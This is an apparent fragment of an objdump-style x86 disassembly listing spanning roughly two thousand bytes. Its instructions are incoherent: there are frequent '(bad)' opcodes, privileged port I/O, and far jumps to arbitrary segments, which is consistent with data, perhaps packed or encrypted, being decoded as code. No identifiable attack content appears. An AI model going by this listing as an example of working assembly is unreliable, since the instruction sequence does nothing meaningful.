  415daf:	in     eax,0x1e
  415db1:	push   eax
  415db2:	in     eax,0x87
  415db4:	aas    
  415db5:	sbb    BYTE PTR [esp+eiz*2-0x112fbf64],al
  415dbc:	mov    dl,0xe4
  415dbe:	mov    ecx,0xe5b47dbd
  415dc4:	xor    al,0xce
  415dc6:	inc    ecx
  415dc7:	xlat   BYTE PTR ds:[ebx]
  415dc8:	inc    esp
  415dc9:	and    esp,edi
  415dcb:	pop    eax
  415dcc:	mul    ecx
  415dce:	lea    ebp,[edx-0x1fc06356]
  415dd4:	pop    eax
  415dd5:	mov    ds:0xbd2685e8,eax
  415dda:	aaa    
  415ddb:	in     al,dx
  415ddc:	mov    ch,0xad
  415dde:	jno    0x415e01
  415de0:	adc    DWORD PTR [edi-0x4d55b5f7],0x62
  415de7:	xor    BYTE PTR ds:0x3b474857,ch
  415ded:	cmp    al,0xc7
  415def:	push   esi
  415df0:	pop    eax
  415df1:	xchg   DWORD PTR [ebx-0xd],eax
  415df4:	sti    
  415df5:	mov    edi,0x24f2b10b
  415dfa:	cmp    DWORD PTR [ebx+0x56],ebx
  415dfd:	mov    esp,0xee9c752d
  415e02:	les    ebx,FWORD PTR [eax]
  415e04:	xlat   BYTE PTR ds:[ebx]
  415e05:	add    al,0x45
  415e07:	cmovs  eax,DWORD PTR [esi+0x19]
  415e0b:	test   ecx,ecx
  415e0d:	dec    ebp
  415e0e:	pop    ebp
  415e0f:	or     edx,eax
  415e11:	xchg   ebx,eax
  415e12:	pop    edi
  415e13:	inc    ebp
  415e14:	jbe    0x415e12
  415e16:	fnstcw WORD PTR [edi-0xa]
  415e19:	test   edx,edx
  415e1b:	inc    edi
  415e1c:	add    eax,0xdb1cd8af
  415e21:	test   eax,0xe07ab97a
  415e26:	inc    esi
  415e27:	mov    ds:0xbb36a205,eax
  415e2c:	idiv   BYTE PTR [ebp-0x3c6432cd]
  415e32:	mov    edi,0x34e68d9d
  415e37:	dec    eax
  415e38:	jae    0x415dd9
  415e3a:	xchg   DWORD PTR [edx-0x26b283b7],esp
  415e40:	stc    
  415e41:	or     BYTE PTR [ebx+ecx*4],ah
  415e44:	pop    ecx
  415e45:	repnz fidivr WORD PTR [esi-0x71]
  415e49:	push   ss
  415e4a:	or     eax,0x2f2e6116
  415e4f:	adc    eax,0xcef4af5e
  415e54:	push   edx
  415e55:	pop    esp
  415e56:	dec    eax
  415e57:	xchg   edi,eax
  415e58:	push   edi
  415e59:	leave  
  415e5a:	ins    DWORD PTR es:[edi],dx
  415e5b:	iret   
  415e5c:	push   0x3c94fe0c
  415e61:	mov    bl,0x76
  415e63:	out    dx,al
  415e64:	in     eax,0xca
  415e66:	popa   
  415e67:	mov    ebp,0xbaa86544
  415e6c:	cli    
  415e6d:	adc    esp,DWORD PTR [edx+0x18]
  415e70:	out    dx,al
  415e71:	stc    
  415e72:	outs   dx,DWORD PTR ds:[esi]
  415e73:	ret    0x639d
  415e76:	test   BYTE PTR [edi-0x6b],dh
  415e79:	jecxz  0x415ef2
  415e7b:	push   edx
  415e7c:	(bad)  
  415e7d:	sub    esi,DWORD PTR cs:[esi-0x672a1478]
  415e84:	add    BYTE PTR [esi-0x467894c],dh
  415e8a:	jle    0x415e74
  415e8c:	je     0x415e88
  415e8e:	mov    bl,0xbf
  415e90:	jle    0x415e55
  415e92:	test   al,0x1d
  415e95:	xchg   edx,eax
  415e96:	jge    0x415f08
  415e98:	or     al,0x24
  415e9a:	and    cl,dh
  415e9c:	mov    edi,0x6dc4918d
  415ea1:	add    ebx,DWORD PTR [esi]
  415ea3:	in     eax,0x8a
  415ea5:	push   edi
  415ea6:	je     0x415e69
  415ea8:	pushf  
  415ea9:	sahf   
  415eaa:	or     DWORD PTR [ecx],0x42
  415ead:	xor    al,0x42
  415eaf:	xchg   DWORD PTR [edi-0x3ed845a9],ebx
  415eb5:	lahf   
  415eb6:	in     al,dx
  415eb7:	pushf  
  415eb8:	sti    
  415eb9:	mov    dh,BYTE PTR [eax+0x436cd3f5]
  415ebf:	mov    edx,0xb5a597d4
  415ec4:	popf   
  415ec5:	fs out dx,eax
  415ec7:	mov    esi,0x1f946a90
  415ecc:	sbb    ah,cl
  415ece:	push   edx
  415ecf:	adc    ebp,edi
  415ed1:	bound  ebx,QWORD PTR [esp+edi*8+0x1f351084]
  415ed8:	fcomp  st(6)
  415eda:	sbb    ecx,DWORD PTR [eax]
  415edc:	or     ebp,DWORD PTR [ecx]
  415ede:	jg     0x415e93
  415ee0:	adc    eax,0x80439c63
  415ee5:	outs   dx,BYTE PTR ds:[esi]
  415ee6:	shl    ebp,0x9c
  415ee9:	popf   
  415eea:	cli    
  415eeb:	sbb    al,0x4a
  415eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eee:	ja     0x415f6c
  415ef0:	or     DWORD PTR [ebx+0x26],edx
  415ef3:	lea    eax,[ecx+0x52072e3]
  415ef9:	adc    dh,BYTE PTR [esi+edx*2+0x70]
  415efd:	call   0xc159:0x5c5222e5
  415f04:	pusha  
  415f05:	jp     0x415f44
  415f07:	(bad)  
  415f08:	mov    ds:0xd51c7fac,al
  415f0d:	mov    BYTE PTR [edi+0x68b34fe3],dh
  415f13:	mov    ds:0x654e1490,eax
  415f18:	in     al,0x5d
  415f1a:	pop    ss
  415f1b:	and    al,0x18
  415f1d:	jnp    0x415f0e
  415f1f:	add    edi,ebx
  415f21:	jge    0x415f67
  415f23:	jmp    0x4849:0x4dde6ffd
  415f2a:	nop
  415f2b:	mov    WORD PTR [ebx+eiz*2],fs
  415f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f2f:	mov    edx,0x960d93b4
  415f34:	ret    0xaee2
  415f37:	pushf  
  415f38:	iret   
  415f39:	pusha  
  415f3a:	jae    0x415ee6
  415f3c:	jl     0x415f9e
  415f3e:	cmp    bl,BYTE PTR [edi-0x5a]
  415f41:	add    BYTE PTR [edx+0x340e336d],al
  415f47:	cmp    eax,0xf21e7b51
  415f4c:	gs inc ebp
  415f4e:	xchg   ebx,eax
  415f4f:	mov    edi,0x2ee96ef0
  415f54:	or     eax,ecx
  415f56:	iret   
  415f57:	push   ebx
  415f58:	shl    BYTE PTR [eax+0x702faa15],1
  415f5e:	les    eax,FWORD PTR [edi]
  415f60:	mov    ebp,0x40bc314c
  415f65:	mov    eax,0x3ee48cf7
  415f6a:	stos   DWORD PTR es:[edi],eax
  415f6b:	sahf   
  415f6c:	jb     0x415f5a
  415f6e:	int    0x6c
  415f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f71:	sbb    al,0x1a
  415f73:	fist   DWORD PTR [eax-0x7ae802b]
  415f79:	test   DWORD PTR [ebx],0x6d5c8053
  415f7f:	pop    es
  415f80:	mov    edi,fs
  415f82:	sar    DWORD PTR [esi+ebx*4-0x53],0x86
  415f87:	test   al,0xf5
  415f89:	jge    0x415fb7
  415f8b:	mov    al,ds:0xc4498237
  415f90:	sub    al,0xef
  415f92:	push   ebx
  415f93:	jp     0x415f9a
  415f95:	push   esp
  415f96:	jecxz  0x415f71
  415f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f99:	dec    DWORD PTR [eax-0x30]
  415f9c:	(bad)  
  415f9d:	loope  0x416003
  415f9f:	out    0xf4,al
  415fa1:	mov    ah,0x91
  415fa3:	xchg   esi,eax
  415fa4:	cmp    al,0xb7
  415fa6:	cwde   
  415fa7:	pop    edx
  415fa8:	loopne 0x415f3f
  415faa:	adc    DWORD PTR [ebx],ebp
  415fac:	aas    
  415fad:	sbb    esp,edx
  415faf:	jge    0x415fa7
  415fb1:	es xchg ecx,eax
  415fb3:	or     cl,BYTE PTR [ebx-0x3fe6f4f3]
  415fb9:	and    ah,BYTE PTR [edx]
  415fbb:	dec    eax
  415fbc:	sub    BYTE PTR [edx-0xcf969e4],cl
  415fc2:	mov    esi,0x51acab66
  415fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fc8:	sbb    BYTE PTR gs:[eax-0x36058fa3],dh
  415fcf:	add    eax,0x27536871
  415fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd5:	retf   
  415fd6:	or     DWORD PTR [ecx+0x14],ebx
  415fd9:	fild   DWORD PTR [ebp-0x1c204382]
  415fdf:	cs push edi
  415fe1:	mov    dl,0xf0
  415fe3:	ret    0x3734
  415fe6:	call   0x4be0:0xeea206b2
  415fed:	xchg   esi,eax
  415fee:	xlat   BYTE PTR ds:[ebx]
  415fef:	sar    DWORD PTR [esi+0x63],1
  415ff2:	cmp    DWORD PTR [esi],esi
  415ff4:	push   ds
  415ff5:	inc    esp
  415ff6:	xor    dl,cl
  415ff8:	xor    al,0x55
  415ffa:	mov    al,ds:0x7c2dc816
  415fff:	sbb    eax,eax
  416001:	push   ecx
  416002:	jne    0x416012
  416004:	xchg   edx,eax
  416005:	push   eax
  416006:	leave  
  416007:	push   eax
  416008:	mov    ch,0x78
  41600a:	jb     0x415fab
  41600c:	xchg   edx,eax
  41600d:	(bad)  
  41600e:	sub    BYTE PTR [ebp-0x70],ch
  416011:	(bad)  
  416012:	mov    ebx,0xae06bff9
  416017:	pusha  
  416018:	fnstcw WORD PTR [ecx]
  41601a:	out    0xa9,al
  41601c:	jbe    0x41609c
  41601e:	push   ebx
  41601f:	push   esp
  416020:	lahf   
  416021:	adc    al,0x39
  416023:	(bad)  
  416024:	rcr    DWORD PTR [edx-0x63bbeb56],1
  41602a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41602b:	fild   DWORD PTR [ecx]
  41602d:	test   eax,0xdf262c82
  416032:	add    eax,0x625ae905
  416037:	pop    ss
  416038:	and    eax,0xc6a42935
  41603d:	into   
  41603e:	retf   0x305a
  416041:	enter  0x4834,0x73
  416045:	mov    dl,0xb5
  416047:	pop    edi
  416048:	cwde   
  416049:	jno    0x4160b9
  41604b:	scas   al,BYTE PTR es:[edi]
  41604c:	(bad)  
  41604d:	fmul   st,st(0)
  41604f:	mov    eax,0x8349f65
  416054:	push   ss
  416055:	xor    DWORD PTR [ebp-0x4a883527],ebp
  41605b:	ins    BYTE PTR es:[edi],dx
  41605c:	scas   eax,DWORD PTR es:[edi]
  41605d:	adc    bh,BYTE PTR ds:0x28c2094f
  416063:	out    0x2,eax
  416065:	stos   DWORD PTR es:[edi],eax
  416066:	dec    esi
  416067:	jb     0x4160c0
  416069:	sbb    eax,0xa1aaa5c0
  41606e:	nop
  41606f:	mov    ch,0xdc
  416071:	fwait
  416072:	sbb    BYTE PTR [ebx+0x2c8d7382],ch
  416078:	arpl   WORD PTR [ebx],si
  41607a:	test   BYTE PTR [ebp-0x49de0bc5],bh
  416080:	sbb    eax,0xbebaeed4
  416085:	retf   
  416086:	ror    BYTE PTR ds:0xf176ea43,0x7c
  41608d:	jne    0x416047
  41608f:	fmul   QWORD PTR [edi+ebp*2-0x7bf241c2]
  416096:	cwde   
  416097:	or     edx,eax
  416099:	xchg   edx,eax
  41609a:	cmp    edx,esi
  41609c:	fisttp DWORD PTR [eax+0x3e85238]
  4160a2:	xchg   ebp,esp
  4160a4:	push   ebx
  4160a5:	cmc    
  4160a6:	add    eax,0xa940802a
  4160ab:	pop    ebx
  4160ac:	push   edi
  4160ad:	mov    dl,0xf3
  4160af:	and    DWORD PTR [eax+0x79e48195],0x40
  4160b6:	inc    ebx
  4160b7:	jecxz  0x416097
  4160b9:	cdq    
  4160ba:	test   DWORD PTR [edi],ebx
  4160bc:	mov    cl,0x91
  4160be:	fnstcw WORD PTR [ebx]
  4160c0:	into   
  4160c1:	pop    esi
  4160c2:	or     bh,BYTE PTR ds:0xceac4aa1
  4160c8:	and    edi,DWORD PTR [ebx-0xea61b4b]
  4160ce:	pop    edx
  4160cf:	dec    esi
  4160d0:	inc    edx
  4160d1:	push   esi
  4160d2:	arpl   WORD PTR [eax+0x2c],bx
  4160d5:	inc    edx
  4160d6:	cs fucom st(1)
  4160d9:	hlt    
  4160da:	adc    esi,DWORD PTR [esi-0x47]
  4160dd:	mov    dh,0xd
  4160df:	ins    DWORD PTR es:[edi],dx
  4160e0:	or     BYTE PTR [esp+esi*8+0x1c],bh
  4160e4:	inc    esp
  4160e5:	call   0xb96e5bcb
  4160ea:	imul   eax,edi,0x5407a4eb
  4160f0:	fs jge 0x41614f
  4160f3:	mov    ds:0x45875c80,eax
  4160f8:	stc    
  4160f9:	xor    BYTE PTR [ebx],bl
  4160fb:	lock psubw mm5,mm7
  4160ff:	add    dh,bl
  416101:	enter  0xd213,0xab
  416105:	fist   DWORD PTR ss:[ecx]
  416108:	scas   eax,DWORD PTR es:[edi]
  416109:	mov    DWORD PTR [ebx-0x651c0a09],0xb5d8086c
  416113:	adc    BYTE PTR [bx+si],al
  416116:	stos   DWORD PTR es:[edi],eax
  416117:	or     edi,DWORD PTR [eax]
  416119:	push   eax
  41611a:	mov    BYTE PTR [eax-0x4d1d87b3],ah
  416120:	sub    eax,0x56724a3
  416125:	push   0x1e
  416127:	add    al,0xe9
  41612a:	and    al,0x5e
  41612c:	int3   
  41612d:	mov    esi,0x30326e37
  416132:	pop    es
  416133:	add    DWORD PTR [eax-0x41fea687],ecx
  416139:	imul   ebp,edx,0xc25639af
  41613f:	jmp    0xd695:0xbef9aeb4
  416146:	pop    ebp
  416147:	jl     0x4161a0
  416149:	lods   eax,DWORD PTR ds:[esi]
  41614a:	mov    edi,0x7ec06356
  41614f:	nop
  416150:	adc    eax,0xe50265a5
  416155:	add    DWORD PTR [ecx],esi
  416157:	inc    edi
  416158:	sar    DWORD PTR [ebx+0x7206235],1
  41615e:	enter  0xb874,0x56
  416162:	push   ecx
  416163:	jg     0x4161a3
  416165:	(bad)  
  416167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416168:	push   cs
  416169:	xlat   BYTE PTR ds:[ebx]
  41616a:	shl    eax,1
  41616c:	(bad)  
  41616d:	test   eax,0xca77f223
  416172:	cld    
  416173:	ret    
  416174:	iret   
  416175:	inc    ecx
  416176:	lahf   
  416177:	pusha  
  416178:	data16 icebp 
  41617a:	xchg   DWORD PTR [ebp+0x4acd4b59],eax
  416180:	ret    0x48be
  416183:	add    al,0xd6
  416185:	or     eax,0xd7971c32
  41618a:	or     BYTE PTR [ebx+0x46],cl
  41618d:	mov    ebx,0x456074d5
  416192:	repz push 0x8049ad7e
  416198:	pop    eax
  416199:	call   0x187d:0x66b661f2
  4161a0:	leave  
  4161a1:	xchg   ebp,eax
  4161a2:	in     eax,0x98
  4161a4:	mov    BYTE PTR [esi],0x26
  4161a7:	and    bl,ah
  4161a9:	push   0xc655fecb
  4161ae:	push   ebx
  4161af:	clc    
  4161b0:	repnz out dx,al
  4161b2:	mov    ch,0x1e
  4161b4:	jle    0x4161aa
  4161b6:	jo     0x4161c7
  4161b8:	popa   
  4161b9:	ins    BYTE PTR es:[edi],dx
  4161ba:	xor    ebp,esp
  4161bc:	gs or  ebp,ebp
  4161bf:	das    
  4161c0:	aas    
  4161c1:	test   DWORD PTR [ecx-0x54],0xa9ebee81
  4161c8:	and    al,0x7b
  4161ca:	cmp    al,0xdf
  4161cc:	cmc    
  4161cd:	push   eax
  4161ce:	std    
  4161cf:	cli    
  4161d0:	pusha  
  4161d1:	adc    DWORD PTR [eax-0x17],edi
  4161d4:	repz sar BYTE PTR [ebx+0x5af4db0a],cl
  4161db:	sub    DWORD PTR [edi-0x48],ecx
  4161de:	pop    esi
  4161df:	add    ebx,eax
  4161e1:	rcl    BYTE PTR [eax+0x7c],1
  4161e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161e5:	push   0xffffffc3
  4161e7:	imul   ecx,DWORD PTR [ebp-0x16],0x9682b4e6
  4161ee:	popa   
  4161ef:	mov    ds:0x6cdbfcb,eax
  4161f4:	or     eax,DWORD PTR [edi+0x5]
  4161f7:	mov    al,ds:0x9146e16e
  4161fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161fd:	je     0x4161ca
  4161ff:	cdq    
  416200:	xchg   ecx,eax
  416201:	or     BYTE PTR [edi-0x69],cl
  416204:	std    
  416205:	aaa    
  416206:	pop    ds
  416207:	pop    ds
  416208:	stc    
  416209:	into   
  41620a:	sbb    ecx,DWORD PTR [ebx-0x3b]
  41620d:	(bad)  
  41620f:	aam    0x8a
  416211:	cmp    cl,dl
  416213:	inc    ebp
  416214:	xchg   ecx,eax
  416215:	fwait
  416216:	das    
  416217:	mov    ds:0xb161612c,al
  41621c:	and    edx,ebx
  41621e:	add    edi,DWORD PTR [ebx]
  416220:	jge    0x4161bb
  416222:	add    BYTE PTR [esi],cl
  416224:	sbb    eax,0xdce84538
  416229:	cmp    eax,0xfbd084e2
  41622e:	daa    
  41622f:	out    dx,al
  416230:	dec    edi
  416231:	push   edx
  416232:	mov    WORD PTR [eax-0x3],gs
  416235:	ret    
  416236:	bound  ebx,QWORD PTR [ebx+0x5d]
  416239:	pop    ds
  41623a:	imul   ebp,DWORD PTR [esi],0xffffff93
  41623d:	xchg   edx,eax
  41623e:	ret    
  41623f:	sub    BYTE PTR [esi-0x2f],0x86
  416243:	stc    
  416244:	sbb    eax,0xa36cce06
  416249:	push   ds
  41624a:	arpl   WORD PTR [ecx],di
  41624c:	inc    ecx
  41624d:	mov    ah,0x22
  41624f:	mov    ebx,eax
  416251:	add    esp,DWORD PTR [ecx+0x32b53af]
  416257:	dec    ebx
  416258:	pop    ebp
  416259:	pop    ss
  41625a:	jge    0x416231
  41625c:	call   0x9d98:0xf99807e5
  416263:	in     al,dx
  416264:	mov    BYTE PTR [eax+0x67d73364],ch
  41626a:	xchg   esp,eax
  41626b:	aam    0x85
  41626d:	pop    es
  41626e:	pop    edx
  41626f:	mov    ?,WORD PTR [ecx-0x75]
  416272:	hlt    
  416273:	sbb    cl,BYTE PTR [ecx+esi*1-0x4ba79623]
  41627a:	call   0xc188:0x3aaf68cb
  416281:	in     al,dx
  416282:	dec    edx
  416283:	jecxz  0x416282
  416285:	mov    WORD PTR [ebp-0x421941ec],ds
  41628b:	ins    DWORD PTR es:[edi],dx
  41628c:	(bad)  
  41628d:	(bad)  
  41628e:	jnp    0x416233
  416290:	aad    0x41
  416292:	mov    dh,bl
  416294:	(bad)  
  416295:	pop    ds
  416296:	call   0xfa81:0x1544341b
  41629d:	aaa    
  41629e:	mov    ecx,DWORD PTR [esi+0x10]
  4162a1:	push   edx
  4162a2:	shl    DWORD PTR [ecx+0x2504c26b],cl
  4162a8:	out    dx,eax
  4162a9:	test   eax,0xdd6bb4f
  4162ae:	or     BYTE PTR [ebx],cl
  4162b0:	mov    eax,ds:0xcd0dd1ff
  4162b5:	sub    eax,0xc9fdcb07
  4162ba:	xor    DWORD PTR ss:[ecx],esp
  4162bd:	xchg   ebx,eax
  4162be:	mov    ch,0x73
  4162c0:	mov    eax,ds:0x69bdf04a
  4162c5:	outs   dx,BYTE PTR ds:[esi]
  4162c6:	(bad)  
  4162c7:	std    
  4162c8:	xor    BYTE PTR [ebx+0x6f43d7f2],0xf9
  4162cf:	mov    edx,0x116eb8df
  4162d4:	pop    esp
  4162d5:	pop    ebx
  4162d6:	sub    BYTE PTR [edi],ah
  4162d8:	sub    eax,0x57f1d895
  4162dd:	fstp   TBYTE PTR [eax+0xa9fa93e]
  4162e3:	into   
  4162e4:	and    BYTE PTR [ebx],al
  4162e6:	mov    dl,0xab
  4162e8:	imul   DWORD PTR [edi+edi*1+0x11798281]
  4162ef:	aaa    
  4162f0:	adc    ebp,esp
  4162f2:	aas    
  4162f3:	pop    eax
  4162f4:	xor    al,BYTE PTR [eax-0x217b840f]
  4162fa:	mov    edi,0x16518683
  4162ff:	inc    eax
  416300:	paddsb mm0,mm1
  416303:	(bad)  
  416304:	and    esp,DWORD PTR [ebx-0x56cf9822]
  41630a:	xchg   ecx,eax
  41630b:	dec    eax
  41630c:	aad    0xc8
  41630e:	(bad)  
  41630f:	pushf  
  416310:	jg     0x416380
  416312:	inc    ebx
  416313:	adc    BYTE PTR [ebx],ch
  416315:	arpl   WORD PTR [esi],di
  416317:	sub    DWORD PTR [ecx+edi*2-0x7d],ebp
  41631b:	ins    BYTE PTR es:[edi],dx
  41631c:	xchg   ecx,eax
  41631d:	cmp    DWORD PTR [ebp+0x1bdc7613],ecx
  416323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416324:	outs   dx,BYTE PTR ds:[esi]
  416325:	outs   dx,DWORD PTR ds:[esi]
  416326:	mov    esp,0x3e7ea34a
  41632b:	and    eax,0xbaf89e88
  416330:	sbb    BYTE PTR [ebx+0x414b75c],cl
  416336:	push   ss
  416337:	or     al,BYTE PTR [ebx+0x6a]
  41633a:	mov    ds:0x3aa6e340,eax
  41633f:	in     al,dx
  416340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416341:	xchg   esi,eax
  416342:	mov    ebx,0x6fe9fd14
  416347:	push   eax
  416348:	mov    edx,0x2f95cbae
  41634d:	adc    eax,0x8d1e1d2b
  416352:	aad    0xd9
  416354:	or     eax,0xe9e10a5c
  416359:	or     bh,cl
  41635b:	not    ch
  41635d:	retf   
  41635e:	jne    0x416325
  416360:	pop    edi
  416361:	mov    edx,0x2a8e465a
  416366:	mov    edx,0xe10b6af7
  41636b:	push   ecx
  41636c:	outs   dx,DWORD PTR ds:[esi]
  41636d:	in     al,dx
  41636e:	cmc    
  41636f:	sti    
  416370:	inc    edi
  416371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416372:	lods   al,BYTE PTR ds:[esi]
  416373:	in     al,dx
  416374:	dec    esp
  416375:	inc    edx
  416376:	or     ch,BYTE PTR [esi]
  416378:	stc    
  416379:	pop    ss
  41637a:	pop    eax
  41637b:	ror    bl,cl
  41637d:	addr16 xchg edx,eax
  41637f:	push   esp
  416380:	mov    edi,0x87947e2
  416385:	lods   eax,DWORD PTR ds:[esi]
  416386:	jnp    0x416332
  416388:	int3   
  416389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41638a:	sbb    ebp,DWORD PTR [ebp+edx*1-0x29]
  41638e:	pop    edx
  41638f:	xchg   edx,eax
  416390:	or     eax,ebp
  416392:	nop
  416393:	sub    bh,dh
  416395:	jecxz  0x416411
  416397:	add    BYTE PTR [esi],bh
  416399:	pop    es
  41639a:	jl     0x416393
  41639c:	and    eax,0xb9f7797e
  4163a1:	xor    BYTE PTR [edi+esi*4-0x30],0x61
  4163a6:	mov    ebp,0xf881d87b
  4163ab:	cwde   
  4163ac:	ret    0x8e26
  4163af:	jno    0x4163f4
  4163b1:	data16 jle 0x4163b5
  4163b4:	mov    ch,0xdc
  4163b6:	cmp    DWORD PTR [ebp+edi*2-0x1604d9ae],0x19
  4163be:	pop    edx
  4163bf:	mov    ss,WORD PTR [ebx-0x34aa725d]
  4163c5:	fs push edx
  4163c7:	int3   
  4163c8:	iret   
  4163c9:	hlt    
  4163ca:	or     ecx,DWORD PTR [eax]
  4163cc:	sar    DWORD PTR [ebx],0x54
  4163cf:	cld    
  4163d0:	in     al,dx
  4163d1:	cmp    bh,BYTE PTR [edx-0x6c]
  4163d4:	scas   eax,DWORD PTR es:[edi]
  4163d5:	inc    eax
  4163d6:	and    dl,bl
  4163d8:	stc    
  4163d9:	std    
  4163da:	pop    es
  4163db:	add    BYTE PTR [edx-0x1feab3de],dh
  4163e1:	(bad)  
  4163e2:	loopne 0x4163b5
  4163e4:	mov    ds:0xa6214699,eax
  4163e9:	and    DWORD PTR [ecx+0x5435b21a],eax
  4163ef:	cmp    DWORD PTR [ebx],ebp
  4163f1:	sti    
  4163f2:	es jmp 0xa7c28951
  4163f8:	call   0x7588:0x61e61cb2
  4163ff:	ss dec ecx
  416401:	(bad)  
  416402:	or     al,0x8
  416404:	mov    ebp,edi
  416406:	aam    0xdd
  416408:	pop    esp
  416409:	jne    0x4163d8
  41640b:	inc    ebp
  41640c:	dec    esi
  41640d:	mov    esp,0x82ca1dc1
  416412:	aam    0xa3
  416414:	inc    ebx
  416415:	iret   
  416416:	and    DWORD PTR [eax],edx
  416418:	xor    al,BYTE PTR [eax-0x6f]
  41641b:	inc    eax
  41641c:	xchg   ecx,eax
  41641d:	call   0x898:0x73a62b11
  416424:	pop    es
  416425:	fsub   QWORD PTR [eax-0x9]
  416428:	add    BYTE PTR [ebp+0x6727da7c],0x2
  41642f:	mov    ah,0xb6
  416431:	mov    esp,esi
  416433:	lahf   
  416434:	sti    
  416435:	adc    edx,DWORD PTR [eax-0x4036dbe]
  41643b:	aas    
  41643c:	in     eax,dx
  41643d:	jne    0x416400
  41643f:	je     0x4163ea
  416441:	call   0xa5d3:0xa59848f6
  416448:	mov    ds:0xfc59b4f7,al
  41644d:	sub    BYTE PTR [esi+0x1e],dh
  416450:	loope  0x4164cd
  416452:	xchg   ebp,eax
  416453:	sub    DWORD PTR [si-0x4d],edi
  416457:	or     eax,0x400bffd4
  41645c:	and    ah,BYTE PTR [edi-0x3921dffd]
  416462:	jb     0x4164a5
  416464:	loopne 0x41644d
  416466:	xchg   ecx,eax
  416467:	inc    eax
  416468:	loope  0x416436
  41646a:	sbb    BYTE PTR [esi],dh
  41646c:	fiadd  WORD PTR [ebp-0x70269d42]
  416472:	out    0x7b,al
  416474:	push   0x61
  416476:	and    eax,0x89d7becf
  41647b:	call   0xb572:0x743fb280
  416482:	(bad)  
  416483:	imul   ebx,DWORD PTR [eax+0x7becf02a],0x960a21aa
  41648d:	xchg   edi,eax
  41648e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41648f:	sub    dl,ch
  416491:	ror    BYTE PTR [esi+edx*8],1
  416494:	bnd jb 0x416515
  416497:	shl    BYTE PTR [eax+0x1f],0x4c
  41649b:	ficom  WORD PTR [ebp-0x2db8f70f]
  4164a1:	outs   dx,BYTE PTR ds:[esi]
  4164a2:	das    
  4164a3:	aaa    
  4164a4:	stc    
  4164a5:	push   edx
  4164a6:	xor    al,0x3e
  4164a9:	and    eax,0x6c0206c7
  4164ae:	jnp    0x4164bb
  4164b0:	mov    dl,0x6a
  4164b2:	mov    dl,0x5
  4164b4:	mov    eax,0x58a7cd5c
  4164b9:	retf   0x513c
  4164bc:	mov    esi,0x22dd2d14
  4164c1:	inc    ebp
  4164c2:	pop    eax
  4164c3:	in     eax,0xa
  4164c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c6:	jmp    0xb463fe7d
  4164cb:	inc    eax
  4164cc:	gs push ebp
  4164ce:	add    al,0x3
  4164d0:	in     al,dx
  4164d1:	or     BYTE PTR [ebx],ah
  4164d3:	push   cs
  4164d4:	ins    BYTE PTR es:[edi],dx
  4164d5:	out    dx,al
  4164d6:	lods   al,BYTE PTR es:[esi]
  4164d8:	neg    DWORD PTR [eax+edx*4]
  4164db:	ss loop 0x416544
  4164de:	sbb    ebp,DWORD PTR [ebp+eiz*8-0x7fa080f2]
  4164e5:	jmp    0x4164bb
  4164e7:	mov    ebp,0x8423a1c5
  4164ec:	xchg   edx,eax
  4164ed:	mov    bh,0xd2
  4164ef:	jnp    0x41648b
  4164f1:	loop   0x41655a
  4164f3:	sahf   
  4164f4:	mov    edx,0x8a55c350
  4164f9:	(bad)  
  4164fa:	jbe    0x41649a
  4164fc:	mov    bl,BYTE PTR [bx+si]
  4164ff:	ret    
  416500:	push   cs
  416501:	sub    BYTE PTR [eax+ebp*4+0x159beba7],0x17
  416509:	add    eax,0xf93702df
  41650e:	xchg   ebp,eax
  41650f:	xor    dl,0xf8
  416512:	imul   DWORD PTR [ebx-0x70]
  416515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416516:	in     al,0x77
  416518:	jnp    0x41650d
  41651a:	std    
  41651b:	jns    0x4164d7
  41651d:	loope  0x4164dc
  41651f:	add    ah,dl
  416521:	in     al,0x2e
  416523:	push   ebx
  416524:	mov    edi,0x1d788ddf
  416529:	mov    ebx,0xf8b3eb30
  41652e:	das    
  41652f:	jle    0x4164d5
  416531:	xchg   edi,eax
  416532:	pushf  
  416533:	inc    edi
  416534:	clc    
  416535:	ficomp WORD PTR ds:0x28021ed7
  41653b:	jb     0x416542
  41653d:	out    dx,al
  41653e:	bound  eax,QWORD PTR ds:0xc7126f6f
  416544:	cmp    BYTE PTR [eax+edi*8-0x5e232b37],ch
  41654b:	ds (bad) 
  41654d:	popf   
  41654e:	jp     0x416596
  416550:	(bad)  
  416551:	and    ebp,edx
  416553:	pop    es
  416554:	fmul   QWORD PTR [ebx]
  416556:	adc    bh,dh
  416558:	push   esi
  416559:	and    al,0xf8
  41655b:	mov    eax,DWORD PTR [ebx-0x4c]
  41655e:	fdivp  st(5),st
  416560:	popa   
  416561:	lds    ebx,FWORD PTR [ecx-0x1080465]
  416567:	adc    ebp,DWORD PTR [ebx-0x5060d8b5]
  41656d:	int3   
  41656e:	cli    
  41656f:	pop    edx
  416570:	leave  
  416571:	in     al,0xeb
  416573:	push   ecx
  416574:	cmp    esi,esp
  416576:	cmp    BYTE PTR ds:0xa972d365,dl
  41657c:	fstp   DWORD PTR [ecx-0x43]
  41657f:	add    BYTE PTR [ecx-0x2],al
  416582:	mov    WORD PTR [edi+0x62],gs
  416585:	test   al,0x91
  416587:	fwait
  416588:	(bad)  
  416589:	pushf  
  41658a:	(bad)  
  41658b:	jmp    0x7556:0xc5d26365
  416592:	je     0x416574
  416594:	xchg   ebp,eax
  416595:	bound  edi,QWORD PTR [edi+0x38]
  416598:	popf   
  416599:	inc    edi
  41659a:	jno    0x4165a9
  41659c:	adc    eax,0x6fea874
  4165a1:	jle    0x416530
  4165a3:	adc    esp,DWORD PTR [ebx-0x3198e135]
